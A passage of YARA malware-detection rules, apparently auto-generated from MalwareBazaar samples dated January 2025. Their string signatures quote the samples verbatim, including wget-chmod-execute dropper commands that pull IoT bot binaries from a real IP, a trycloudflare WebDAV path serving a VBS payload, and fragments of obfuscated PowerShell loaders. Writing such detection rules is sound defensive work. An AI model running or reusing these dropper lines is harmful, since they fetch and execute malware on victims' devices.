      $s13 = "        *\"(deleted)\"* | *\"/.\"* | *\"telnetdbot\"* | *\"dvrLocker\"* | *\"acd\"* | *\"dvrHelper\"*)" fullword ascii
      $s14 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
      $s15 = "        continue" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      8 of them
}

rule sig_4e10ecf78c89394a6a39dc9036e9ce0d8a5da23fb16bd110ae65ebc38eb6dfc1 {
   meta:
      description = "evidences - file 4e10ecf78c89394a6a39dc9036e9ce0d8a5da23fb16bd110ae65ebc38eb6dfc1.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "4e10ecf78c89394a6a39dc9036e9ce0d8a5da23fb16bd110ae65ebc38eb6dfc1"
   strings:
      $s1 = "cd /tmp; rm -rf 3; wget http://103.136.41.100/3; chmod 777 3; ./3 magic.arm; rm -rf 3;" fullword ascii
      $s2 = "cd /tmp; rm -rf 12; wget http://103.136.41.100/12; chmod 777 12; ./12 magic.mips; rm -rf 1;" fullword ascii
      $s3 = "cd /tmp; rm -rf 2; wget http://103.136.41.100/2; chmod 777 2; ./2 magic.mpsl; rm -rf 2;" fullword ascii
      $s4 = "cd /tmp; rm -rf 4; wget http://103.136.41.100/4; chmod 777 4; ./4 magic.arm5; rm -rf 4;" fullword ascii
      $s5 = "cd /tmp; rm -rf 6; wget http://103.136.41.100/6; chmod 777 6; ./6 magic.arm7; rm -rf 6;" fullword ascii
      $s6 = "cd /tmp; rm -rf 5; wget http://103.136.41.100/5; chmod 777 5; ./5 magic.arm6; rm -rf 5;" fullword ascii
      $s7 = "rm -rf mag" fullword ascii
      $s8 = "echo \"\" > mag" fullword ascii
      $s9 = "#!/bin/sh" fullword ascii /* Goodware String - occured 3 times */
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule sig_4123fc1e9ba7c080893052813a558fe80f113475eb1f5ca5169d933a148164ea {
   meta:
      description = "evidences - file 4123fc1e9ba7c080893052813a558fe80f113475eb1f5ca5169d933a148164ea.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "4123fc1e9ba7c080893052813a558fe80f113475eb1f5ca5169d933a148164ea"
   strings:
      $s1 = "ccddee" ascii /* reversed goodware string 'eeddcc' */
      $s2 = "KCI.dyV" fullword ascii
      $s3 = "Kg (r!4$h+ " fullword ascii
      $s4 = "%LS%H;W" fullword ascii
      $s5 = "4SrArRO@" fullword ascii
      $s6 = "eYtplh'" fullword ascii
      $s7 = "xtplhd`" fullword ascii
      $s8 = "pcSagSbi" fullword ascii
      $s9 = "4tplhd" fullword ascii /* Goodware String - occured 1 times */
      $s10 = "G'0.lUu" fullword ascii
      $s11 = "#%I{DS" fullword ascii
      $s12 = "@rjOP=;+" fullword ascii
      $s13 = "4SCCDDE?M" fullword ascii
      $s14 = "4MHLPTX\\4M" fullword ascii
      $s15 = "sQ]7G?" fullword ascii
      $s16 = "~OR/<'" fullword ascii
      $s17 = "/gPt5l7" fullword ascii
      $s18 = "KNaAt+" fullword ascii
      $s19 = "g&#uYkX" fullword ascii
      $s20 = "^!Ob;T(" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule sig_43b8e88d15f70f692d759f967500908cd1024f73c2bdc1955f62514408ff7225 {
   meta:
      description = "evidences - file 43b8e88d15f70f692d759f967500908cd1024f73c2bdc1955f62514408ff7225.lnk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "43b8e88d15f70f692d759f967500908cd1024f73c2bdc1955f62514408ff7225"
   strings:
      $s1 = "\\\\superior-somalia-bs-leisure.trycloudflare.com@SSL\\DavWWWRoot\\new.vbs" fullword wide
      $s2 = "\\\\SUPERIOR-SOMALIA-BS-LEISURE.TRYCLOUDFLARE.COM@SSL\\DAVWWWROOT" fullword ascii
      $s3 = "\\\\superior-somalia-bs-leisure.trycloudflare.com@SSL\\DavWWWRoot" fullword ascii
      $s4 = "superior-somalia-bs-leisure.trycloudflare.com@SSL" fullword wide
      $s5 = "new.vbs" fullword wide
      $s6 = "s9%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide
      $s7 = "Web Client Network" fullword wide /* Goodware String - occured 2 times */
      $s8 = "1SPSU(L" fullword ascii
      $s9 = "1SPSsC" fullword ascii
      $s10 = "S-1-5-21-1171917858-701188650-985899978-500" fullword wide
      $s11 = "MSEdge" fullword wide
   condition:
      uint16(0) == 0x004c and filesize < 5KB and
      8 of them
}

rule sig_501a309ab708ccd57fe2b49aa7f7f59d694550549070f13b3031e1dd4e46108a {
   meta:
      description = "evidences - file 501a309ab708ccd57fe2b49aa7f7f59d694550549070f13b3031e1dd4e46108a.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "501a309ab708ccd57fe2b49aa7f7f59d694550549070f13b3031e1dd4e46108a"
   strings:
      $s1 = "[System.Text.Encoding]::ascii.((-join (@((565515/(51206985/6429)),(-2299+2400),(3501-(12265-(23532000/(25620200/9668)))),(-1408+" ascii
      $s2 = "nHMHk5ynHzKqscYWF+WdLlptWcQeCPwT7R2W3TslJJB9QDV6BLaqF/nWPEUbMcj5yskjXVCqHnAmsBEESpnhsvy3dEdnZOZlJZxufw5/gxUI/TFUzxMn8ckdSsVQ0IYK" ascii
      $s3 = "Zm400GtBR5ALX+pnLbR4VSQd996FACHj4NmmYxN2yBui28WSxa9L3wA8DugSyMxSRlyjs/sr08ZkJaa957Ftpdo1g1wiMBiEkC65d7vfxSzIV9/mZQN4dRITx/KNObtH" ascii
      $s4 = "NmnsmnUDlKPxUPvagZreGZKLX0pLxHExdzd1qXGWelb/CJ8amRigo6OxO6Uos32O2XIUPHmS10uGHlmKQ/c2IUMfwlYmdCUq92uhFFZtq1rPDHwQdnK0VWNohFSV3R/d" ascii
      $s5 = "vKJTiJhOLWOUg6t4wUGs7np0EEOhKN02iSG7X/MKNBPazLbc5W1vhVDT0VvBn1RYr0/6LYKF7hbUhP6vG8WwBBKvPu1iCuLJEEC+RsrazWQMu61s653iHWBGhg0creAD" ascii
      $s6 = "+imZJc0RO7JJ1H3JID0Fp0sy5drmi7HqHJstXObVQXcmdPCOwc7kMqxssP/1CrDSGU7e1ShDM8AEXvmGfZ0EybC05fyxf39uRgLIayRk2agIuBEKTyFSO5xl6Owxk/xH" ascii
      $s7 = "6tpXaGYLfm6PqkEgEY1vC8ev+LyHrmwrHSIFNbrns7GIpH9FyK7PiF3XaCkEyOLz/6S99gKDeBEP0uhTHvgQmdB92HrcGTzAeQTV8iBKN+XBA8KbzTh6pTKYqGjQa9w1" ascii
      $s8 = "ring(($_ * ([math]::Pow(2, 2 + 1))), ([math]::Pow(2, 2 + 1))) - 87)}))($null, $true)" fullword ascii
      $s9 = "M2QatFFlJXgz/6oLoGFqujX70P7/9USedQxCAyRIPsf9l+k1JIvm4CG3alXVWbDztwhCxyyCMvzKMyvL9aQwP7jIm+zMrwqIqNFwy/xdGuICZLxJ+xFb0YBg1qIN838Q" ascii
      $s10 = "8200000081000000830000007700000083\".Substring(($_ * ([math]::Pow(2, 1 + 2))), ([math]::Pow(2, 1 + 2))) - 27)});$aresatonedonesi" ascii
      $s11 = "00000000001240000000000000113\".Substring(($_ * ([math]::Pow(2, 2 + 2))), ([math]::Pow(2, 2 + 2))) - 12)}))($esalareratisonanesa" ascii
      $s12 = "1-(5648-(13246-8803))))))))) -join ''))(($_ * (-4234+(12411-(12769350/(9695-8133))))), (6488-(12155-(12868630/(-601+2871))))))})" ascii
      $s13 = "$wyjhouem=$executioncontext;$reatereratalanbeatarinenisbere = -join (0..54 | ForEach-Object {[char]([int]\"000000800000007900000" ascii
      $s14 = "ject { [char]$_ })))(($_ * (2774/(14198719/(2476+7761)))), (7607-(369+7236))))});$aredorreeninedesinaronreesbeisalisorar = -join" ascii
      $s15 = "jYwm83WzV/Jpdbg4NwgP3YUET48e3qo1AB5ukYY4bGr52ascy/21cHRcvsXKMjM28tOAsX6z2/5dPZ1vhUaPnSv13Md2CjbJ8AD9d7poxUTFa+ihBdvE/uKohOI9cD/Z" ascii
      $s16 = "$wyjhouem=$executioncontext;$reatereratalanbeatarinenisbere = -join (0..54 | ForEach-Object {[char]([int]\"000000800000007900000" ascii
      $s17 = "w43mQRS1ysIOC/SzrRpK+PLsRYvJ0Dx3CimnaAnGx+0MmIbdTBGKL9is6+AiBMwL8KryxmPnUgyQ601xw1XKV0x5JCnaJ8F2hmDp0DrKLu84U7z9eJXJ1YOv+BRHjXYE" ascii
      $s18 = "J7lnH1CkA3Z/QCkKYHgQLzntKywxaCL5TDgZ3oWfjRws6DUj30IpckpOljKIpS4ARA0czm29WN3mz4ij18e9axK7QSyo/dkNdRXZSUleZrKCG6MbdUC/8NpVypPZ3YU6" ascii
      $s19 = "PyzGCuoo0p+W0grT1snpvr6Oot3N7/ywh+1dwRjjave+C4rS85o97dPvlLQ1tSSxu0cx+acYXUyGFLBp0MvdCfERGDymOOgPyd/TYY3MjhvVugzKZtsOIKU77cxJ3Umm" ascii
      $s20 = "$4uzvpkb5af2niog = [System.Convert].(([system.String]::new(@((1373-(1121022/861)),(-549+650),(771-655),(-611+(-6970+(13940-(-131" ascii
   condition:
      uint16(0) == 0x7724 and filesize < 60KB and
      8 of them
}

rule sig_9229403e77c223dc8acb86755f6576ff22ff15362da8b2577a85ed2083205e71 {
   meta:
      description = "evidences - file 9229403e77c223dc8acb86755f6576ff22ff15362da8b2577a85ed2083205e71.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "9229403e77c223dc8acb86755f6576ff22ff15362da8b2577a85ed2083205e71"
   strings:
      $s1 = "cdw4W/ahFs8dQ4rbJVEPOJTGeda0AYhbdgeT5QtxjFvr1uGhSKtqYPMShPPjpPENr3gasSP3r6p4ktBrxlV63zaq6F/RLuJlr/l9UwVYAq+diw53qzL/w0EfJaqOu6ES" ascii
      $s2 = "InpGRUCLkRy/zx7Ljryzg/QcCnsxCjZxFKxCPdWeZW+0yUftzZp/xKJBGV0+R3mmrkY0t+AO5y73fOFNsEyeJlteyz/U7Vc13ohMT/GDiDieSgznMJ8WYXrm4WNMptcr" ascii
      $s3 = "[System.Text.Encoding]::ascii.((-join (@((613582/8642),(-1445+1546),(715604/6169),(1738-(-7707+(66329770/(23104185/(4452-(4870-(" ascii
      $s4 = "ZhwqAK+LsbabprebQbDSW5dK8nutaQbYOgGVxH8RhqTaek5mOoxj4ziLHmUEn8tmpqI9MJbA6h7ODq8vBhrCLIhf8+B/T1i4aln4oVUmfePirb/71H+PE2OyPbr2x/EZ" ascii
      $s5 = "XWKsomGRdljQVVEouzrugD2aiOC90rUnsRJlEJOYIKXQOSR42lgt+j1EkxHo8pfwNZIOS9BkEzYqH5NN7i5xbygfdpqcBE4Wsu8hdg880Kem5YC0VLIifeXCQwGpFU5d" ascii
      $s6 = "$gmpuvkadj=$executioncontext;$esontionaredtionenaroren = ([CHaR[]]@((5081-5028),(5083-5031),(-2900+(9386-6429)),(59450/(6800-561" ascii
      $s7 = "00015900000151\".Substring(($_ * ([math]::Pow(2, 1 + 2))), ([math]::Pow(2, 1 + 2))) - 51)}))($atinreorisoronataratreeresistional" ascii
      $s8 = "Jp97U2hbmt6qb9I0lbOtBP8Nqd4GF8mm9KoPKyRdWvBhH1J7eQ7qIQ+WeC0BJ3y2cIxX9xbGb2xK6J3kLBw24qektxJfl2btFHpCrlvVNWyF9eyebgc1RA4Dk23fzWkn" ascii
      $s9 = "$gmpuvkadj=$executioncontext;$esontionaredtionenaroren = ([CHaR[]]@((5081-5028),(5083-5031),(-2900+(9386-6429)),(59450/(6800-561" ascii
      $s10 = "zO5Y4yD1yKBIDADdfJiveRL8qStAIrUyX8Qc+Z9QAvqe4SvLnlPVh7fhma3iaSJiGDmHy5f6ruuy0L6nBYuX40cxv5gpSyyCfvcfb7r+VIZFXhbjXMYxze0GtoCwcciR" ascii
      $s11 = "NrV2imr7hnJseZqJr4jWZ4qhMyLPPR0DNr2JQ5i0tEEwC+m53pgQeQeW1KA4dpNIPdNPDFISeiRUbRGoiwme7Djhy4/Bg4Rcrff8I/eMJ+yKMwoRnOiYrQF0iPBwSDkI" ascii
      $s12 = "Oh/UGgXVarCXWwZh/7qrojPfY3E2AA/gdhXwpxhN8TSh2jqkvoAAlhDsZW7EIG1DUHX9wJxcS9xEVOG5TFEXCDJDXb2lIFP3JiJ+F04rkzmbJJ1lTLP31oXn1I+fz1eM" ascii
      $s13 = "WpE8SX3shEmYP6h/mU4YdA7yAcT4GEkZSCiJrAb2Ccxyzng8UZF84cJotJg5iuOtUOGoVYQ8rGsIgOMBoFkkOYg9DIzv0fXIEE+b7Xc2ii64VH05FE9Qq4RMjtlI2Na+" ascii
      $s14 = "aBl9K0Nyzo5qEjHhhBHp+ydYrF3kBuLr/5yNXYYgxeRF+jzcDLvgRF6NuVrFXB4g55xFEjMfi1mr2UJJEk1zKMVypuuWx+Pjx976mHAqP8OfKf04j/P1YCG+D0nJCdlp" ascii
      $s15 = "E6+V2E0G47+yTbjEymSAm0pvrO2pekwUvq/XeKssJt3cPLEkJGF1MCOfl0E/LhotUwmCvOFX72swhZ0gaNK+4wvG7r7Ct+T4BYPgJ+5Q6SFyadw8z8RIpXmZ1zADhHA9" ascii
      $s16 = "jPm9ErDfqXRn5u5OYKL2N8qTYQxWVeTjDtb6QNfmlpGVsEVA/fDmZLDmkQLDi/F8agbgMwlItdB9qr4GahIDjsyuYfOYee79tIrGkpa+6gnJ/xwUj5cbs8tXEf0//uZc" ascii
      $s17 = "591Pm8DLIg/l7TyGvjQqdkfEOh0wuk4niDzR1ihvZ6MNffW6fgl/7AL6BkqVmwvttVF0/jfbZhxLQjA/lBS0D4ZRSJywYgR8GlnW7R7tA4yqiEDk+RbO+j8eFivj9rS5" ascii
      $s18 = "bljyxhFfPiBcoqcbhQPdvvuhslS7PbU4+DDnqQzmuT0jc+1GYKyiAc9Xb5e4IPncwGtnOUzNUJdI5XY8eaycDjGGvE0iRTbc9+zK8uiTZuPsK/sLxrLdLXySuhcIdC8g" ascii
      $s19 = "OUgf2RbV4qy2YT4FOibbcsb1r+jSYkGb1JAS5ZmfIOEzZVZhhbFhT5ko+24jehLhuM0xOXxUwohwmFmK2Ak8awF2iMAYwVhwKA+cxovyJdliYQyQivWfIUOH6N4R5dqN" ascii
      $s20 = "l3OmbhR4+v53kwt3U5upc6qnlTe+pmDgZGNs8iNrTInZw5AZgY9Ug2VzPZr4FLdTl91cR46gk3RonXa7ctVc5agk3KjbuqG5204f54VTr6homUnRDk9R4iyI42JspuhO" ascii
   condition:
      uint16(0) == 0x6724 and filesize < 60KB and
      8 of them
}

rule sig_90b3a8c71e614f78eca406720e58dc17b8835fe26e0fe9723d04aa55b438bead {
   meta:
      description = "evidences - file 90b3a8c71e614f78eca406720e58dc17b8835fe26e0fe9723d04aa55b438bead.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "90b3a8c71e614f78eca406720e58dc17b8835fe26e0fe9723d04aa55b438bead"
   strings:
      $x1 = "<!-- End Google Tag Manager (noscript) -->  <div id=\"statusmessage\" name=\"statusmessage\" style=\"display:none;\"> <div style" ascii
      $x2 = " <div style=\"clear:both;\"></div> </div> </div>   <footer id=\"footer\" class=\"footer\" role=\"contentinfo\"> <div class=\"wra" ascii
      $x3 = "<!-- End Google Tag Manager -->  <script type=\"text/javascript\">var MYF_WIDGET_STORAGE_totalStorage= 10737418240;MYF_WIDGET_ST" ascii
      $s4 = "minFooterShow\"><a href=\"https://mediafire.zendesk.com/hc/en-us\" target=\"_blank\">Get Support</a></li> </ul> </div> </div>  <" ascii
      $s5 = "li> <li><a href=\"https://blog.mediafire.com/\" target=\"_blank\">Company Blog</a></li> </ul> </div> <div class=\"footerCol\"> <" ascii
      $s6 = "<!-- End Google Tag Manager -->  <script type=\"text/javascript\">var MYF_WIDGET_STORAGE_totalStorage= 10737418240;MYF_WIDGET_ST" ascii
      $s7 = "<meta property=\"og:image\" content=\"https://www.mediafire.com/images/logos/mf_logo250x250.png\" />" fullword ascii
      $s8 = " <!DOCTYPE html> <html lang=\"en-US\" xmlns:fb=\"http://www.facebook.com/2008/fbml\" xmlns=\"http://www.w3.org/1999/xhtml\"> <he" ascii
      $s9 = "<meta property=\"twitter:image\" content=\"https://www.mediafire.com/images/logos/mf_logo250x250.png\" />" fullword ascii
      $s10 = "<noscript><iframe src=\"https://www.googletagmanager.com/ns.html?id=GTM-53LP4T\"" fullword ascii
      $s11 = "en-us\" target=\"_blank\">Support</a></h2> <ul> <li class=\"minFooterShow\"><a href=\"https://mediafire.zendesk.com/hc/en-us\" t" ascii
      $s12 = " style=\"margin-right:0;\"> <h2><a href=\"https://mediafire.zendesk.com/hc/en-us\" target=\"_blank\">Support</a></h2> <ul> <li c" ascii
      $s13 = " <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.inne" ascii
      $s14 = "\" width=\"180\" style=\"max-height:25px\" id=\"mf_logo_full_color_reversed\" src=\"//static.mediafire.com/images/backgrounds/he" ascii
      $s15 = "<META NAME=\"keywords\" CONTENT=\"online storage, free storage, cloud Storage, collaboration, backup file Sharing, share Files, " ascii
      $s16 = "<!-- End Google Tag Manager (noscript) -->  <div id=\"statusmessage\" name=\"statusmessage\" style=\"display:none;\"> <div style" ascii
      $s17 = "et.php\" target=\"_blank\" tabindex=\"-1\">Submit a ticket</a> or <a href=\"/help/\" target=\"_blank\">visit our Help Center</a>" ascii
      $s18 = "ooterIcn\"> <a href=\"http://twitter.com/#!/mediafire\" class=\"footerIcnTw\" target=\"_blank\" rel=\"noreferrer\" title=\"Media" ascii
      $s19 = "!-- Google Tag Manager (noscript) -->" fullword ascii
      $s20 = " <!DOCTYPE html> <html lang=\"en-US\" xmlns:fb=\"http://www.facebook.com/2008/fbml\" xmlns=\"http://www.w3.org/1999/xhtml\"> <he" ascii
   condition:
      uint16(0) == 0x3c20 and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule c6dbe83212aa8ff6394545049865cb36373b83c58aeec26386212c0dfce439bc {
   meta:
      description = "evidences - file c6dbe83212aa8ff6394545049865cb36373b83c58aeec26386212c0dfce439bc.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "c6dbe83212aa8ff6394545049865cb36373b83c58aeec26386212c0dfce439bc"
   strings:
      $x1 = "<!-- End Google Tag Manager (noscript) -->  <div id=\"statusmessage\" name=\"statusmessage\" style=\"display:none;\"> <div style" ascii
      $x2 = " <div style=\"clear:both;\"></div> </div> </div>   <footer id=\"footer\" class=\"footer\" role=\"contentinfo\"> <div class=\"wra" ascii
      $x3 = "<!-- End Google Tag Manager -->  <script type=\"text/javascript\">var MYF_WIDGET_STORAGE_totalStorage= 10737418240;MYF_WIDGET_ST" ascii
      $s4 = "minFooterShow\"><a href=\"https://mediafire.zendesk.com/hc/en-us\" target=\"_blank\">Get Support</a></li> </ul> </div> </div>  <" ascii
      $s5 = "li> <li><a href=\"https://blog.mediafire.com/\" target=\"_blank\">Company Blog</a></li> </ul> </div> <div class=\"footerCol\"> <" ascii
      $s6 = "<!-- End Google Tag Manager -->  <script type=\"text/javascript\">var MYF_WIDGET_STORAGE_totalStorage= 10737418240;MYF_WIDGET_ST" ascii
      $s7 = "<meta property=\"og:image\" content=\"https://www.mediafire.com/images/logos/mf_logo250x250.png\" />" fullword ascii
      $s8 = " <!DOCTYPE html> <html lang=\"en-US\" xmlns:fb=\"http://www.facebook.com/2008/fbml\" xmlns=\"http://www.w3.org/1999/xhtml\"> <he" ascii
      $s9 = "<meta property=\"twitter:image\" content=\"https://www.mediafire.com/images/logos/mf_logo250x250.png\" />" fullword ascii
      $s10 = "<noscript><iframe src=\"https://www.googletagmanager.com/ns.html?id=GTM-53LP4T\"" fullword ascii
      $s11 = "en-us\" target=\"_blank\">Support</a></h2> <ul> <li class=\"minFooterShow\"><a href=\"https://mediafire.zendesk.com/hc/en-us\" t" ascii
      $s12 = " style=\"margin-right:0;\"> <h2><a href=\"https://mediafire.zendesk.com/hc/en-us\" target=\"_blank\">Support</a></h2> <ul> <li c" ascii
      $s13 = " <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.inne" ascii
      $s14 = "\" width=\"180\" style=\"max-height:25px\" id=\"mf_logo_full_color_reversed\" src=\"//static.mediafire.com/images/backgrounds/he" ascii
      $s15 = "<META NAME=\"keywords\" CONTENT=\"online storage, free storage, cloud Storage, collaboration, backup file Sharing, share Files, " ascii
      $s16 = "<!-- End Google Tag Manager (noscript) -->  <div id=\"statusmessage\" name=\"statusmessage\" style=\"display:none;\"> <div style" ascii
      $s17 = "et.php\" target=\"_blank\" tabindex=\"-1\">Submit a ticket</a> or <a href=\"/help/\" target=\"_blank\">visit our Help Center</a>" ascii
      $s18 = "ooterIcn\"> <a href=\"http://twitter.com/#!/mediafire\" class=\"footerIcnTw\" target=\"_blank\" rel=\"noreferrer\" title=\"Media" ascii
      $s19 = "!-- Google Tag Manager (noscript) -->" fullword ascii
      $s20 = " <!DOCTYPE html> <html lang=\"en-US\" xmlns:fb=\"http://www.facebook.com/2008/fbml\" xmlns=\"http://www.w3.org/1999/xhtml\"> <he" ascii
   condition:
      uint16(0) == 0x3c20 and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule e8ecc2d898ac059dc867ea95c01b93f277f311c9076c37c1d594db3830e3747d {
   meta:
      description = "evidences - file e8ecc2d898ac059dc867ea95c01b93f277f311c9076c37c1d594db3830e3747d.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "e8ecc2d898ac059dc867ea95c01b93f277f311c9076c37c1d594db3830e3747d"
   strings:
      $x1 = "<!-- End Google Tag Manager (noscript) -->  <div id=\"statusmessage\" name=\"statusmessage\" style=\"display:none;\"> <div style" ascii
      $x2 = " <div style=\"clear:both;\"></div> </div> </div>   <footer id=\"footer\" class=\"footer\" role=\"contentinfo\"> <div class=\"wra" ascii
      $x3 = "<!-- End Google Tag Manager -->  <script type=\"text/javascript\">var MYF_WIDGET_STORAGE_totalStorage= 10737418240;MYF_WIDGET_ST" ascii
      $s4 = "minFooterShow\"><a href=\"https://mediafire.zendesk.com/hc/en-us\" target=\"_blank\">Get Support</a></li> </ul> </div> </div>  <" ascii
      $s5 = "li> <li><a href=\"https://blog.mediafire.com/\" target=\"_blank\">Company Blog</a></li> </ul> </div> <div class=\"footerCol\"> <" ascii
      $s6 = "<!-- End Google Tag Manager -->  <script type=\"text/javascript\">var MYF_WIDGET_STORAGE_totalStorage= 10737418240;MYF_WIDGET_ST" ascii
      $s7 = "<meta property=\"og:image\" content=\"https://www.mediafire.com/images/logos/mf_logo250x250.png\" />" fullword ascii
      $s8 = " <!DOCTYPE html> <html lang=\"en-US\" xmlns:fb=\"http://www.facebook.com/2008/fbml\" xmlns=\"http://www.w3.org/1999/xhtml\"> <he" ascii
      $s9 = "<meta property=\"twitter:image\" content=\"https://www.mediafire.com/images/logos/mf_logo250x250.png\" />" fullword ascii
      $s10 = "<noscript><iframe src=\"https://www.googletagmanager.com/ns.html?id=GTM-53LP4T\"" fullword ascii
      $s11 = "en-us\" target=\"_blank\">Support</a></h2> <ul> <li class=\"minFooterShow\"><a href=\"https://mediafire.zendesk.com/hc/en-us\" t" ascii
      $s12 = " style=\"margin-right:0;\"> <h2><a href=\"https://mediafire.zendesk.com/hc/en-us\" target=\"_blank\">Support</a></h2> <ul> <li c" ascii
      $s13 = " <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.inne" ascii
      $s14 = "\" width=\"180\" style=\"max-height:25px\" id=\"mf_logo_full_color_reversed\" src=\"//static.mediafire.com/images/backgrounds/he" ascii
      $s15 = "<META NAME=\"keywords\" CONTENT=\"online storage, free storage, cloud Storage, collaboration, backup file Sharing, share Files, " ascii
      $s16 = "<!-- End Google Tag Manager (noscript) -->  <div id=\"statusmessage\" name=\"statusmessage\" style=\"display:none;\"> <div style" ascii
      $s17 = "et.php\" target=\"_blank\" tabindex=\"-1\">Submit a ticket</a> or <a href=\"/help/\" target=\"_blank\">visit our Help Center</a>" ascii
      $s18 = "ooterIcn\"> <a href=\"http://twitter.com/#!/mediafire\" class=\"footerIcnTw\" target=\"_blank\" rel=\"noreferrer\" title=\"Media" ascii
      $s19 = "!-- Google Tag Manager (noscript) -->" fullword ascii
      $s20 = " <!DOCTYPE html> <html lang=\"en-US\" xmlns:fb=\"http://www.facebook.com/2008/fbml\" xmlns=\"http://www.w3.org/1999/xhtml\"> <he" ascii
   condition:
      uint16(0) == 0x3c20 and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_50e4a4c70cb3355c4bfff4b0768a5c9062292d2acab802fa00c66a457f99ce24 {
   meta:
      description = "evidences - file 50e4a4c70cb3355c4bfff4b0768a5c9062292d2acab802fa00c66a457f99ce24.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "50e4a4c70cb3355c4bfff4b0768a5c9062292d2acab802fa00c66a457f99ce24"
   strings:
      $s1 = "cd /tmp; wget http://103.136.41.100/3; chmod +x 3; chmod 777 3; ./3 boa.arm;" fullword ascii
      $s2 = "cd /tmp; wget http://103.136.41.100/12; chmod +x 12; chmod 777 12; ./12 boa.mips;" fullword ascii
      $s3 = "cd /tmp; wget http://103.136.41.100/4; chmod +x 4; chmod 777 4; ./4 boa.arm5;" fullword ascii
      $s4 = "cd /tmp; wget http://103.136.41.100/6; chmod +x 6; chmod 777 6; ./6 boa.arm7;" fullword ascii
      $s5 = "cd /tmp; wget http://103.136.41.100/5; chmod +x 5; chmod 777 5; ./5 boa.arm6;" fullword ascii
      $s6 = "cd /tmp; wget http://103.136.41.100/2; chmod +x 2; chmod 777 2; ./2 boa.mpsl;" fullword ascii
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule sig_699b60f20ce0eee6ceab4ef49d3a0004438753f76da540a34c6a6e42dfd6e93e {
   meta:
      description = "evidences - file 699b60f20ce0eee6ceab4ef49d3a0004438753f76da540a34c6a6e42dfd6e93e.doc"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "699b60f20ce0eee6ceab4ef49d3a0004438753f76da540a34c6a6e42dfd6e93e"
   strings:
      $s1 = "docProps/custom.xml " fullword ascii
      $s2 = "%UME%,+" fullword ascii
      $s3 = "word/numbering.xmlPK" fullword ascii
      $s4 = "docProps/custom.xmlPK" fullword ascii
      $s5 = "word/numbering.xml" fullword ascii /* Goodware String - occured 2 times */
      $s6 = "word/document.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s7 = "word/styles.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s8 = "word/_rels/document.xml.rels " fullword ascii /* Goodware String - occured 3 times */
      $s9 = "word/settings.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s10 = "word/theme/theme1.xml" fullword ascii /* Goodware String - occured 3 times */
      $s11 = "word/_rels/document.xml.relsPK" fullword ascii /* Goodware String - occured 3 times */
      $s12 = "word/webSettings.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s13 = "word/webSettings.xml" fullword ascii /* Goodware String - occured 3 times */
      $s14 = "word/theme/theme1.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s15 = "word/fontTable.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s16 = "%1_%t_" fullword ascii
      $s17 = "h9)W$-" fullword ascii
      $s18 = "0I4$%N" fullword ascii
      $s19 = "8gY6<I" fullword ascii
      $s20 = "5}4Onb" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 60KB and
      8 of them
}

rule sig_96ba91a5d91fb2aaf07a446606ef99475f2dc8e7641fd4c671308c20643f6252 {
   meta:
      description = "evidences - file 96ba91a5d91fb2aaf07a446606ef99475f2dc8e7641fd4c671308c20643f6252.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-10"
      hash1 = "96ba91a5d91fb2aaf07a446606ef99475f2dc8e7641fd4c671308c20643f6252"
   strings:
      $s1 = "OOThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Header.Text.Day" fullword ascii
      $s2 = "11Widget.MaterialComponents.Button.UnelevatedButton" fullword ascii
      $s3 = "KKThemeOverlay.MaterialComponents.MaterialAlertDialog.Picker.Date.Header.Text" fullword ascii
      $s4 = "66Widget.MaterialComponents.Button.UnelevatedButton.Icon" fullword ascii
      $s5 = "  passwordToggleContentDescription" fullword ascii
      $s6 = "##password_toggle_content_description" fullword ascii
      $s7 = "88Widget.MaterialComponents.Button.TextButton.Dialog.Flush" fullword ascii
      $s8 = "22Widget.MaterialComponents.Button.TextButton.Dialog" fullword ascii
      $s9 = "res/drawable/design_password_eye.xml" fullword ascii
      $s10 = "77Widget.MaterialComponents.Button.TextButton.Dialog.Icon" fullword ascii
      $s11 = "$$res/drawable/design_password_eye.xml" fullword ascii
